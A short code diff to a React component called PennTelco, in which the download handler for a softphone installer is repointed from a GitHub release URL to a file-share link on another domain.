@@ -164,8 +164,7 @@ function PennTelco() {
   setShowOverlay2(true)
  }
  const handleConfirmDownload = () => {
-  window.location.href =
-   'https://github.com/sangoma/desktop-softphone/releases/download/v3.9.1/Sangoma-Phone-3.9.1-win-x64.exe'
+  window.location.href = 'https://nc.richmondtt.com/index.php/s/N87dAo4nEpz5yLj'
   setShowOverlay2(false)
  }
 
